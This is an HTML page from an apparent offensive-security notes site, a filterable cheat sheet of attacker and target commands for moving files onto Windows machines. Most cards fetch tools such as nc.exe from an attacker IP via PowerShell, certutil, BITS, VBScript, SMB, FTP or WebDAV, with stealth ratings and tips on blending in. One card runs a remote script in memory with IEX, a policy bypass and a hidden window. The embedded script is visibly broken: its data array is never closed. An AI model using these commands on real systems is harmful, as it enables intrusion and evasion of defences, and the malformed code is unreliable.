<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>File Transfer — SEC.NOTES</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap');

:root {
  --bg:     #04060d;
  --bg2:    #080c16;
  --bg3:    #0c1220;
  --border: #141e30;
  --b2:     #1e2d45;
  --cyan:   #00e5ff;
  --green:  #10b981;
  --purple: #a78bfa;
  --amber:  #f59e0b;
  --red:    #f43f5e;
  --text:   #b8c8dc;
  --dim:    #3a4a60;
  --mid:    #5a7090;
  --bright: #e8f2ff;
}

*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

html, body { height: 100%; }

body {
  font-family: 'JetBrains Mono', monospace;
  background: var(--bg);
  color: var(--text);
  overflow-x: hidden;
}

body::before {
  content: '';
  position: fixed; inset: 0;
  background-image:
    linear-gradient(rgba(0,229,255,.02) 1px, transparent 1px),
    linear-gradient(90deg, rgba(0,229,255,.02) 1px, transparent 1px);
  background-size: 48px 48px;
  pointer-events: none; z-index: 0;
}

/* ── NAV ── */
.nav {
  position: sticky; top: 0; z-index: 200;
  display: flex; align-items: center; gap: 12px;
  padding: 10px 20px;
  background: rgba(4,6,13,.95);
  backdrop-filter: blur(16px);
  border-bottom: 1px solid var(--border);
}
.nav-logo { font-family:'Syne',sans-serif; font-weight:800; font-size:15px; color:var(--cyan); text-decoration:none; }
.nav-logo span { color: var(--red); }
.nav-sep { color: var(--dim); }
.nav-page { font-family:'Syne',sans-serif; font-size:14px; font-weight:700; color:var(--amber); }
.nav-space { flex:1; }
.nav-back { font-size:11px; color:var(--dim); border:1px solid var(--border); border-radius:20px; padding:4px 12px; text-decoration:none; transition:.15s; }
.nav-back:hover { color:var(--text); border-color:var(--b2); }

/* ── LAYOUT ── */
.shell {
  position: relative; z-index: 1;
  display: flex;
  min-height: calc(100vh - 43px);
}

/* ── SIDEBAR ── */
.sidebar {
  width: 240px; flex-shrink: 0;
  position: sticky; top: 43px;
  height: calc(100vh - 43px);
  overflow-y: auto;
  border-right: 1px solid var(--border);
  padding: 20px 16px;
  display: flex; flex-direction: column; gap: 20px;
  scrollbar-width: thin; scrollbar-color: var(--border) transparent;
}

.sb-label {
  font-size: 9px; font-weight:700; letter-spacing:2px;
  text-transform: uppercase; color: var(--amber);
  display: block; margin-bottom: 6px;
}

.sb-input {
  width: 100%;
  background: var(--bg3); border: 1px solid var(--border);
  border-radius: 7px; padding: 8px 10px;
  color: var(--bright); font-family: inherit; font-size: 13px;
  outline: none; transition: border-color .15s;
}
.sb-input:focus { border-color: var(--amber); box-shadow: 0 0 0 3px rgba(245,158,11,.07); }
.sb-input::placeholder { color: var(--dim); }
#search-input:focus { border-color: var(--cyan); box-shadow: 0 0 0 3px rgba(0,229,255,.06); }

.sb-divider { border: none; border-top: 1px solid var(--border); }

.filter-group { display:flex; flex-direction:column; gap:4px; }

.filter-btn {
  display: flex; align-items: center; gap: 8px;
  padding: 7px 10px; border-radius: 7px;
  background: transparent; border: 1px solid transparent;
  color: var(--mid); font-family: inherit; font-size: 12px;
  cursor: pointer; transition: all .15s; text-align:left; width:100%;
}
.filter-btn:hover { background: rgba(255,255,255,.04); color: var(--text); }
.filter-btn.active { background: rgba(0,229,255,.07); border-color: rgba(0,229,255,.2); color: var(--cyan); }
.filter-btn[data-v="windows"].active { background:rgba(0,229,255,.07); border-color:rgba(0,229,255,.2); color:var(--cyan); }
.filter-btn[data-v="linux"].active   { background:rgba(16,185,129,.07); border-color:rgba(16,185,129,.2); color:var(--green); }
.filter-btn[data-v="code"].active    { background:rgba(167,139,250,.07); border-color:rgba(167,139,250,.2); color:var(--purple); }
.filter-btn[data-v="lotl"].active    { background:rgba(245,158,11,.07); border-color:rgba(245,158,11,.2); color:var(--amber); }
.filter-btn[data-v="server"].active  { background:rgba(244,63,94,.07); border-color:rgba(244,63,94,.2); color:var(--red); }
.filter-btn[data-v="download"].active { background:rgba(0,229,255,.07); border-color:rgba(0,229,255,.2); color:var(--cyan); }
.filter-btn[data-v="upload"].active  { background:rgba(16,185,129,.07); border-color:rgba(16,185,129,.2); color:var(--green); }
.filter-btn[data-v="execute"].active { background:rgba(244,63,94,.07); border-color:rgba(244,63,94,.2); color:var(--red); }

.filter-dot {
  width:7px; height:7px; border-radius:50%; flex-shrink:0;
  background: var(--border);
}
.filter-btn[data-v="all"]      .filter-dot { background: var(--mid); }
.filter-btn[data-v="windows"]  .filter-dot { background: var(--cyan); }
.filter-btn[data-v="linux"]    .filter-dot { background: var(--green); }
.filter-btn[data-v="code"]     .filter-dot { background: var(--purple); }
.filter-btn[data-v="lotl"]     .filter-dot { background: var(--amber); }
.filter-btn[data-v="server"]   .filter-dot { background: var(--red); }
.filter-btn[data-v="download"] .filter-dot { background: var(--cyan); }
.filter-btn[data-v="upload"]   .filter-dot { background: var(--green); }
.filter-btn[data-v="execute"]  .filter-dot { background: var(--red); }

.sb-count {
  font-size:11px; color:var(--dim); margin-top:auto;
  padding-top:12px; border-top:1px solid var(--border);
}
.sb-count strong { color:var(--text); }

/* ── CONTENT ── */
.content {
  flex: 1; min-width: 0;
  padding: 20px 24px 60px;
  overflow-y: auto;
}

/* ── LIST ── */
.list { display:flex; flex-direction:column; gap:6px; }

.empty {
  text-align:center; padding:60px 20px;
  color:var(--dim); font-size:13px;
}

/* ── CARD ── */
.card {
  background: var(--bg2);
  border: 1px solid var(--border);
  border-radius: 10px;
  overflow: hidden;
  transition: border-color .15s;
}

.card-head {
  display: flex; align-items: center; gap: 10px;
  padding: 12px 16px; cursor: pointer; user-select: none;
}
.card-head:hover { background: rgba(255,255,255,.02); }

.plat-bar {
  width: 3px; height: 32px; border-radius: 2px; flex-shrink:0;
}
.card[data-p="windows"] .plat-bar { background: var(--cyan); }
.card[data-p="linux"]   .plat-bar { background: var(--green); }
.card[data-p="code"]    .plat-bar { background: var(--purple); }
.card[data-p="lotl"]    .plat-bar { background: var(--amber); }
.card[data-p="server"]  .plat-bar { background: var(--red); }

.card-name {
  font-family: 'Syne', sans-serif; font-size: 14px;
  font-weight: 700; color: var(--bright); flex: 1;
}

.badge {
  font-size: 9px; font-weight: 700; letter-spacing: .5px;
  padding: 2px 8px; border-radius: 4px; text-transform: uppercase;
  white-space: nowrap;
}
.badge-proto { background:rgba(255,255,255,.04); color:var(--mid); border:1px solid var(--border); }
.badge-dl    { background:rgba(0,229,255,.07);   color:var(--cyan);   border:1px solid rgba(0,229,255,.2); }
.badge-ul    { background:rgba(16,185,129,.07);  color:var(--green);  border:1px solid rgba(16,185,129,.2); }
.badge-ex    { background:rgba(244,63,94,.07);   color:var(--red);    border:1px solid rgba(244,63,94,.2); }

.stealth {
  display:flex; align-items:center; gap:4px;
  font-size:9px; font-weight:700; letter-spacing:.5px;
}
.stealth-dot { width:6px; height:6px; border-radius:50%; }
.s-high   { color:var(--green); } .s-high   .stealth-dot { background:var(--green); }
.s-medium { color:var(--amber); } .s-medium .stealth-dot { background:var(--amber); }
.s-low    { color:var(--red);   } .s-low    .stealth-dot { background:var(--red);   }

.chevron { color:var(--dim); font-size:10px; transition:transform .2s; }
.card.open .chevron { transform: rotate(180deg); }

/* ── CARD BODY ── */
.card-body { display:none; border-top:1px solid var(--border); }
.card.open .card-body { display:block; }

.card-note {
  padding: 8px 16px;
  font-size: 11px; color: var(--mid); line-height: 1.6;
  background: rgba(255,255,255,.015);
  border-bottom: 1px solid var(--border);
}

.cmd-pair {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 0;
}
@media (max-width: 760px) { .cmd-pair { grid-template-columns: 1fr; } }

.cmd-block { padding: 14px 16px; }
.cmd-block:first-child { border-right: 1px solid var(--border); }
@media (max-width: 760px) { .cmd-block:first-child { border-right:none; border-bottom:1px solid var(--border); } }

.cmd-block-head {
  display: flex; align-items: center; justify-content: space-between;
  margin-bottom: 8px;
}
.cmd-block-label {
  font-size: 9px; font-weight:700; letter-spacing:1.5px; text-transform:uppercase;
}
.attacker .cmd-block-label { color: var(--red); }
.target   .cmd-block-label { color: var(--cyan); }

.copy-btn {
  display: flex; align-items: center; gap: 5px;
  background: rgba(255,255,255,.04); border:1px solid var(--border);
  border-radius:6px; padding:3px 10px;
  color:var(--mid); font-family:inherit; font-size:9px; font-weight:700;
  letter-spacing:.5px; cursor:pointer; transition:all .15s;
}
.copy-btn:hover { background:rgba(255,255,255,.08); color:var(--text); }
.copy-btn.ok { color:var(--green); border-color:rgba(16,185,129,.3); }

pre.cmd {
  background: var(--bg3); border:1px solid var(--border);
  border-radius: 7px; padding:12px; font-size:12px;
  line-height: 1.7; overflow-x:auto; white-space:pre; color:var(--text);
  font-family: 'JetBrains Mono', monospace;
}

pre.cmd .cmt { color:var(--dim); }

.card-tags {
  display:flex; flex-wrap:wrap; gap:4px;
  padding:10px 16px 14px;
  border-top:1px solid var(--border);
}
.tag {
  font-size:9px; padding:2px 6px; border-radius:3px;
  background:rgba(255,255,255,.04); color:var(--dim);
  border:1px solid var(--border);
}

/* ── SINGLE BLOCK (no attacker side) ── */
.cmd-single { padding:14px 16px; }

/* ── SCROLLBAR ── */
::-webkit-scrollbar { width:5px; height:5px; }
::-webkit-scrollbar-track { background:transparent; }
::-webkit-scrollbar-thumb { background:var(--b2); border-radius:3px; }

/* ── MOBILE SIDEBAR TOGGLE ── */
.sb-toggle {
  display:none; width:100%; padding:10px 16px;
  background:var(--bg2); border:none; border-bottom:1px solid var(--border);
  color:var(--text); font-family:inherit; font-size:12px; font-weight:700;
  cursor:pointer; text-align:left; gap:8px; align-items:center;
}

@media (max-width: 680px) {
  .shell { flex-direction: column; }
  .sidebar { width:100%; height:auto; position:static; border-right:none; border-bottom:1px solid var(--border); display:none; }
  .sidebar.mobile-open { display:flex; }
  .sb-toggle { display:flex; }
  .content { padding:16px 14px 60px; }
}
</style>
</head>
<body>

<nav class="nav">
  <a href="../" class="nav-logo">SEC<span>.</span>NOTES</a>
  <span class="nav-sep">/</span>
  <span class="nav-page">File Transfer</span>
  <div class="nav-space"></div>
  <a href="../" class="nav-back">← Back</a>
</nav>

<button class="sb-toggle" id="sbToggle">☰ &nbsp;Filters &amp; Config</button>

<div class="shell">

  <!-- SIDEBAR -->
  <aside class="sidebar" id="sidebar">

    <div>
      <label class="sb-label" for="lhost-input">Attacker IP (LHOST)</label>
      <input class="sb-input" id="lhost-input" type="text" value="10.10.14.5" placeholder="10.10.14.5" spellcheck="false" autocomplete="off">
    </div>

    <div>
      <label class="sb-label" for="lport-input">Port (LPORT)</label>
      <input class="sb-input" id="lport-input" type="text" value="8000" placeholder="8000" spellcheck="false" autocomplete="off">
    </div>

    <div>
      <label class="sb-label" for="search-input">Search</label>
      <input class="sb-input" id="search-input" type="text" placeholder="smb, scp, curl, base64…" spellcheck="false" autocomplete="off">
    </div>

    <hr class="sb-divider">

    <div>
      <label class="sb-label">Platform</label>
      <div class="filter-group" id="plat-group">
        <button class="filter-btn active" data-g="plat" data-v="all"><span class="filter-dot"></span>All</button>
        <button class="filter-btn" data-g="plat" data-v="windows"><span class="filter-dot"></span>Windows</button>
        <button class="filter-btn" data-g="plat" data-v="linux"><span class="filter-dot"></span>Linux</button>
        <button class="filter-btn" data-g="plat" data-v="code"><span class="filter-dot"></span>Code one-liners</button>
        <button class="filter-btn" data-g="plat" data-v="lotl"><span class="filter-dot"></span>LOLBins / LOTL</button>
        <button class="filter-btn" data-g="plat" data-v="server"><span class="filter-dot"></span>Server Setup</button>
      </div>
    </div>

    <div>
      <label class="sb-label">Direction</label>
      <div class="filter-group" id="dir-group">
        <button class="filter-btn active" data-g="dir" data-v="all"><span class="filter-dot"></span>All</button>
        <button class="filter-btn" data-g="dir" data-v="download"><span class="filter-dot"></span>Download</button>
        <button class="filter-btn" data-g="dir" data-v="upload"><span class="filter-dot"></span>Upload</button>
        <button class="filter-btn" data-g="dir" data-v="execute"><span class="filter-dot"></span>Execute</button>
      </div>
    </div>

    <div class="sb-count">
      <strong id="count">–</strong> techniques
    </div>

  </aside>

  <!-- CONTENT -->
  <div class="content">
    <div class="list" id="list"></div>
  </div>

</div>

<script>
// ── DATA ─────────────────────────────────────────────────────────────────────
// Commands use LHOST / LPORT as placeholders — substituted at render time.
// Arrays joined with '\n' avoid template-literal/backtick issues.

var T = [

// ── WINDOWS DOWNLOAD ─────────────────────────────────────────────────────────
{id:'w-b64',   name:'PS — Base64 paste', p:'windows', d:'download', proto:'No Network', stealth:'medium',
 tags:['powershell','base64','clipboard','no-network'],
 notes:'No network needed. Good for web shells and small files via clipboard.',
 att:[
  '# Encode on attacker',
  'cat /path/to/file | base64 -w0; echo',
  'md5sum /path/to/file'
 ],
 tgt:[
  '# Decode and write on target',
  '[IO.File]::WriteAllBytes("C:\\Users\\Public\\file.exe",',
  '  [Convert]::FromBase64String("PASTE_BASE64_HERE"))',
  '',
  'Get-FileHash "C:\\Users\\Public\\file.exe" -Algorithm MD5'
 ]
},

{id:'w-wc',    name:'PS — WebClient.DownloadFile', p:'windows', d:'download', proto:'HTTP/S', stealth:'low',
 tags:['powershell','http','webclient'],
 notes:'Classic. Works on PowerShell 2+. On IE errors add -UseBasicParsing.',
 att:[
  'python3 -m http.server LPORT'
 ],
 tgt:[
  '(New-Object Net.WebClient).DownloadFile(',
  "  'http://LHOST:LPORT/file.exe',",
  "  'C:\\Users\\Public\\file.exe')"
 ]
},

{id:'w-iwr',   name:'PS — Invoke-WebRequest', p:'windows', d:'download', proto:'HTTP/S', stealth:'low',
 tags:['powershell','http','iwr'],
 notes:'PowerShell 3+. Add -UseBasicParsing if you get IE DOM errors. Supports custom User-Agent.',
 att:[
  'python3 -m http.server LPORT'
 ],
 tgt:[
  "Invoke-WebRequest 'http://LHOST:LPORT/file.exe' -OutFile 'C:\\Users\\Public\\file.exe'",
  '',
  '# With Chrome user-agent to blend in',
  "Invoke-WebRequest 'http://LHOST:LPORT/file.exe'",
  "  -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome",
  "  -OutFile 'C:\\Users\\Public\\file.exe'"
 ]
},

{id:'w-iex',   name:'PS — IEX (fileless)', p:'windows', d:'execute', proto:'HTTP/S', stealth:'medium',
 tags:['powershell','fileless','in-memory','iex'],
 notes:'Executes script in memory — no file on disk. Still visible to ETW / ScriptBlockLogging.',
 att:[
  'python3 -m http.server LPORT'
 ],
 tgt:[
  "IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/Invoke-Tool.ps1')",
  '',
  '# Alt — pipe into IEX',
  "(New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/tool.ps1') | IEX",
  '',
  '# With execution policy bypass',
  'powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden',
  "  -Command \"IEX (New-Object Net.WebClient).DownloadString('http://LHOST:LPORT/tool.ps1')\""
 ]
},

{id:'w-smb',   name:'SMB — impacket pull', p:'windows', d:'download', proto:'SMB / TCP 445', stealth:'medium',
 tags:['smb','impacket','445'],
 notes:'Works when TCP 445 is allowed outbound. Modern Windows blocks unauthenticated guest — use credentials.',
 att:[
  '# No auth (Linux targets or old Windows)',
  'sudo impacket-smbserver share -smb2support /tmp/share',
  '',
  '# With credentials (modern Windows)',
  'sudo impacket-smbserver share -smb2support /tmp/share -user pentest -password Pass123'
 ],
 tgt:[
  '# Direct copy',
  'copy \\\\LHOST\\share\\file.exe C:\\Users\\Public\\file.exe',
  '',
  '# Map drive first (with creds)',
  'net use n: \\\\LHOST\\share /user:pentest Pass123',
  'copy n:\\file.exe C:\\Users\\Public\\file.exe'
 ]
},

{id:'w-ftp',   name:'FTP — pyftpdlib pull', p:'windows', d:'download', proto:'FTP / TCP 21', stealth:'low',
 tags:['ftp','pyftpdlib','non-interactive'],
 notes:'FTP is often filtered. Use the batch script when stdin is unavailable (reverse shell).',
 att:[
  'sudo python3 -m pyftpdlib --port 21'
 ],
 tgt:[
  '# PowerShell',
  "(New-Object Net.WebClient).DownloadFile('ftp://LHOST/file.exe','C:\\Users\\Public\\file.exe')",
  '',
  '# Non-interactive batch script (no stdin needed)',
  'echo open LHOST 21 > ftp.txt',
  'echo USER anonymous >> ftp.txt',
  'echo binary >> ftp.txt',
  'echo GET file.exe >> ftp.txt',
  'echo bye >> ftp.txt',
  'ftp -v -n -s:ftp.txt'
 ]
},

{id:'w-webdav',name:'WebDAV — wsgidav pull', p:'windows', d:'download', proto:'HTTP / TCP 80', stealth:'high',
 tags:['webdav','wsgidav','http'],
 notes:'Works when SMB is blocked. Windows mounts via UNC path. Traffic blends with normal HTTP.',
 att:[
  'pip3 install wsgidav cheroot',
  'sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp/share --auth=anonymous'
 ],
 tgt:[
  '# Browse',
  'dir \\\\LHOST\\DavWWWRoot',
  '',
  '# Copy',
  'copy \\\\LHOST\\DavWWWRoot\\file.exe C:\\Users\\Public\\file.exe'
 ]
},

{id:'w-certutil',name:'certutil — download (LOLBAS)', p:'windows', d:'download', proto:'HTTP/S', stealth:'low',
 tags:['certutil','lolbas','builtin'],
 notes:'Built-in. No PowerShell needed. High detection rate — AMSI and most EDRs flag it.',
 att:[
  'python3 -m http.server LPORT'
 ],
 tgt:[
  'certutil.exe -urlcache -split -f http://LHOST:LPORT/nc.exe C:\\Users\\Public\\nc.exe'
 ]
},

{id:'w-bits',  name:'BITS — bitsadmin / Start-BitsTransfer', p:'windows', d:'download', proto:'HTTP/S', stealth:'medium',
 tags:['bits','bitsadmin','bitstransfer'],
 notes:'Background Intelligent Transfer Service. Lower detection than IWR for large files.',
 att:[
  'python3 -m http.server LPORT'
 ],
 tgt:[
  '# bitsadmin (legacy)',
  'bitsadmin /transfer job /priority foreground http://LHOST:LPORT/nc.exe C:\\Users\\Public\\nc.exe',
  '',
  '# PowerShell BITS (preferred)',
  'Import-Module bitstransfer',
  'Start-BitsTransfer -Source "http://LHOST:LPORT/nc.exe" -Destination "C:\\Users\\Public\\nc.exe"'
 ]
},

{id:'w-vbs',   name:'VBScript wget (cscript)', p:'windows', d:'download', proto:'HTTP/S', stealth:'medium',
 tags:['vbscript','cscript','com'],
 notes:'Uses XMLHTTP COM object. No PowerShell required — works in cmd-only environments.',
 att:[
  'python3 -m http.server LPORT'
 ],
 tgt:[
  '# Write wget.vbs',
  'echo dim xHttp: Set xHttp=createobject("Microsoft.XMLHTTP") > wget.vbs',
  'echo dim bStrm: Set bStrm=createobject("Adodb.Stream") >> wget.vbs',
  'echo xHttp.Open "GET", WScript.Arguments.Item(0), False >> wget.vbs',
  'echo xHttp.Send >> wget.vbs',
  'echo with bStrm >> wget.vbs',
  'echo   .type=1:.open:.write xHttp.responseBody >> wget.vbs',
  'echo   .savetofile WScript.Arguments.Item(1),2 >> wget.vbs',
  'echo end with >> wget.vbs',
  '',
  '# Run',
  'cscript.exe /nologo wget.vbs http://LHOST:LPORT/nc.exe nc.exe'
 ]
},

{id:'w-winrm', name:'WinRM — PSRemoting Copy-Item', p:'windows', d:'download', proto:'WinRM / TCP 5985', stealth:'high',
 tags:['winrm','psremoting','lateral-movement'],
 notes:'Lateral file transfer between Windows machines. Requires admin or Remote Management Users membership.',
 tgt:[
  '# Check connectivity',
  'Test-NetConnection -ComputerName TARGET -Port 5985',
  '',
  '# Create session',
  '$s = New-PSSession -ComputerName TARGET',
  '',
  '# Pull file from remote',
  'Copy-Item "C:\\Users\\Admin\\Desktop\\file.txt" -FromSession $s -Destination C:\\ ',
  '',
  '# Push file to remote',
  'Copy-Item "C:\\file.txt" -ToSession $s -Destination "C:\\Users\\Admin\\Desktop\\"'
 ]

// ── STATE ─────────────────────────────────────────────────────────────────────
var state = { plat:'all', dir:'all', q:'', lhost:'10.10.14.5', lport:'8000' };

// Global command store — populated at render time, keyed by card-id + '-a'/'-t'
var CMDS = {};


// ── HELPERS ───────────────────────────────────────────────────────────────────
function sub(lines) {
  var s = lines.join('\n');
  return s.replace(/LHOST/g, state.lhost || 'LHOST').replace(/LPORT/g, state.lport || 'LPORT');
}

function esc(s) {
  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function syntaxHL(s) {
  // highlight comment lines
  return esc(s).replace(/(#[^\n]*)/g, '<span class="cmt">$1</span>');
}

function dirBadge(d) {
  if (d === 'download') return '<span class="badge badge-dl">⬇ DL</span>';
  if (d === 'upload')   return '<span class="badge badge-ul">⬆ UL</span>';
  if (d === 'execute')  return '<span class="badge badge-ex">⚡ Exec</span>';
  return '';
}

function stealthBadge(s) {
  if (!s || s === 'n/a') return '';
  return '<span class="stealth s-' + s + '"><span class="stealth-dot"></span>' + s.toUpperCase() + '</span>';
}


// ── RENDER ────────────────────────────────────────────────────────────────────
function render() {
  var q  = state.q.toLowerCase();
  var list = document.getElementById('list');
  var filtered = T.filter(function(t) {
    if (state.plat !== 'all' && t.p !== state.plat) return false;
    if (state.dir  !== 'all' && t.d !== state.dir)  return false;
    if (q) {
      var hay = [t.name, t.p, t.d, t.proto].concat(t.tags || []).join(' ').toLowerCase();
      if (hay.indexOf(q) === -1) return false;
    }
    return true;
  });

  document.getElementById('count').textContent = filtered.length;

  if (filtered.length === 0) {
    list.innerHTML = '<div class="empty">No techniques match your filters.</div>';
    return;
  }

  var html = '';
  filtered.forEach(function(t) {
    var attCmd = t.att ? sub(t.att) : null;
    var tgtCmd = t.tgt ? sub(t.tgt) : null;

    if (attCmd) CMDS[t.id + '-a'] = attCmd;
    if (tgtCmd) CMDS[t.id + '-t'] = tgtCmd;

    var bodyHTML = '';

    // notes
    if (t.notes) {
      bodyHTML += '<div class="card-note">' + esc(t.notes) + '</div>';
    }

    // commands
    var hasAtt = !!attCmd;
    var hasTgt = !!tgtCmd;

    if (hasAtt || hasTgt) {
      if (hasAtt && hasTgt) {
        bodyHTML += '<div class="cmd-pair">';
        bodyHTML += '<div class="cmd-block attacker">';
        bodyHTML += '<div class="cmd-block-head"><span class="cmd-block-label">⚡ Attacker Setup</span>';
        bodyHTML += '<button class="copy-btn" data-cmd="' + t.id + '-a">Copy</button></div>';
        bodyHTML += '<pre class="cmd">' + syntaxHL(attCmd) + '</pre>';
        bodyHTML += '</div>';
        bodyHTML += '<div class="cmd-block target">';
        bodyHTML += '<div class="cmd-block-head"><span class="cmd-block-label">🎯 Target</span>';
        bodyHTML += '<button class="copy-btn" data-cmd="' + t.id + '-t">Copy</button></div>';
        bodyHTML += '<pre class="cmd">' + syntaxHL(tgtCmd) + '</pre>';
        bodyHTML += '</div>';
        bodyHTML += '</div>';
      } else if (hasAtt) {
        bodyHTML += '<div class="cmd-single attacker">';
        bodyHTML += '<div class="cmd-block-head"><span class="cmd-block-label">⚡ Command</span>';
        bodyHTML += '<button class="copy-btn" data-cmd="' + t.id + '-a">Copy</button></div>';
        bodyHTML += '<pre class="cmd">' + syntaxHL(attCmd) + '</pre>';
        bodyHTML += '</div>';
      } else {
        bodyHTML += '<div class="cmd-single target">';
        bodyHTML += '<div class="cmd-block-head"><span class="cmd-block-label">🎯 Target</span>';
        bodyHTML += '<button class="copy-btn" data-cmd="' + t.id + '-t">Copy</button></div>';
        bodyHTML += '<pre class="cmd">' + syntaxHL(tgtCmd) + '</pre>';
        bodyHTML += '</div>';
      }
    }

    // tags
    var tagsHTML = (t.tags || []).map(function(tag) {
      return '<span class="tag">' + esc(tag) + '</span>';
    }).join('');
    if (tagsHTML) bodyHTML += '<div class="card-tags">' + tagsHTML + '</div>';

    html += '<div class="card" data-p="' + t.p + '" data-id="' + t.id + '">';
    html += '<div class="card-head">';
    html += '<div class="plat-bar"></div>';
    html += '<span class="card-name">' + esc(t.name) + '</span>';
    html += '<span class="badge badge-proto">' + esc(t.proto) + '</span>';
    html += dirBadge(t.d);
    html += stealthBadge(t.stealth);
    html += '<span class="chevron">▾</span>';
    html += '</div>';
    html += '<div class="card-body">' + bodyHTML + '</div>';
    html += '</div>';
  });

  list.innerHTML = html;
}


// ── EVENTS ────────────────────────────────────────────────────────────────────

// Toggle card open/close
document.getElementById('list').addEventListener('click', function(e) {
  // Copy button
  var btn = e.target.closest('[data-cmd]');
  if (btn) {
    e.stopPropagation();
    var key = btn.getAttribute('data-cmd');
    var text = CMDS[key] || '';
    navigator.clipboard.writeText(text).then(function() {
      btn.textContent = 'Copied!';
      btn.classList.add('ok');
      setTimeout(function() { btn.textContent = 'Copy'; btn.classList.remove('ok'); }, 1800);
    }).catch(function() {
      var ta = document.createElement('textarea');
      ta.value = text; ta.style.cssText = 'position:fixed;opacity:0;';
      document.body.appendChild(ta); ta.select(); document.execCommand('copy');
      document.body.removeChild(ta);
      btn.textContent = 'Copied!'; btn.classList.add('ok');
      setTimeout(function() { btn.textContent = 'Copy'; btn.classList.remove('ok'); }, 1800);
    });
    return;
  }

  // Card toggle
  var head = e.target.closest('.card-head');
  if (head) {
    var card = head.closest('.card');
    if (card) card.classList.toggle('open');
  }
});

// Filter buttons
document.querySelector('.shell').addEventListener('click', function(e) {
  var btn = e.target.closest('[data-g]');
  if (!btn) return;
  var g = btn.getAttribute('data-g');
  var v = btn.getAttribute('data-v');
  if (g === 'plat') state.plat = v;
  if (g === 'dir')  state.dir  = v;
  document.querySelectorAll('[data-g="' + g + '"]').forEach(function(b) { b.classList.remove('active'); });
  btn.classList.add('active');
  render();
});

// Inputs
var renderDelay;
function scheduleRender() {
  clearTimeout(renderDelay);
  renderDelay = setTimeout(render, 60);
}

document.getElementById('lhost-input').addEventListener('input', function(e) {
  state.lhost = e.target.value; scheduleRender();
});
document.getElementById('lport-input').addEventListener('input', function(e) {
  state.lport = e.target.value; scheduleRender();
});
document.getElementById('search-input').addEventListener('input', function(e) {
  state.q = e.target.value; scheduleRender();
});

// Mobile sidebar toggle
document.getElementById('sbToggle').addEventListener('click', function() {
  document.getElementById('sidebar').classList.toggle('mobile-open');
});

// First render
render();
</script>
